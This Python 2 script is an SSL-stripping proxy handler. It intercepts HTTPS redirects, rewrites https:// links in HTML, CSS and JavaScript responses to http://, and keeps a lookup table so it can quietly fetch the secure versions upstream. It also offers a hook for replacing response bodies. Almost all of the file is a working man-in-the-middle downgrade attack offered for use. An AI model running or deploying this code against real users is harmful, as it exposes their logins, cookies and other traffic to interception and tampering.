#!/usr/bin/env python

from SimpleHTTPProxy import SimpleHTTPProxyHandler, test
from urlparse import urlsplit
import re

class SSLStripProxyHandler(SimpleHTTPProxyHandler):
    forward_table = {}

    def request_handler(self, req, body):
        if req.path in self.forward_table:
            req.path = self.forward_table[req.path]

    def response_handler(self, req, res, body):
        location = res.headers.get('Location', '')
        if location.startswith('https://'):
            http_url = "http://" + location[len('https://'):]
            self.forward_table[http_url] = location

            req.command = 'GET'
            req.path = location
            self.do_SPAM()
            return True
        else:
            replaced_body = self.ssl_response_handler(req, res, body)
            if replaced_body is True:
                return True
            elif replaced_body is not None:
                body = replaced_body

            content_type = res.headers.get('Content-Type', '')
            if content_type.startswith('text/html') or content_type.startswith('text/css') or content_type.startswith('text/javascript'):
                re_url = r'((["\'])\s*)https://([\w\-.~%!$&\'()*+,;=:@/?#]+)(\s*\2)'    # based on RFC 3986
                for m in re.finditer(re_url, body):
                    self.forward_table["http://%s" % m.group(3)] = "https://%s" % m.group(3)
                body = re.sub(re_url, r'\1http://\3\4', body)

            return body

    def ssl_response_handler(self, req, res, body):
        # override here
        # return True if you sent the response here and the proxy should not connect to the upstream server
        # return replaced body (other than None and True) if you did
        pass


if __name__ == '__main__':
    test(HandlerClass=SSLStripProxyHandler)
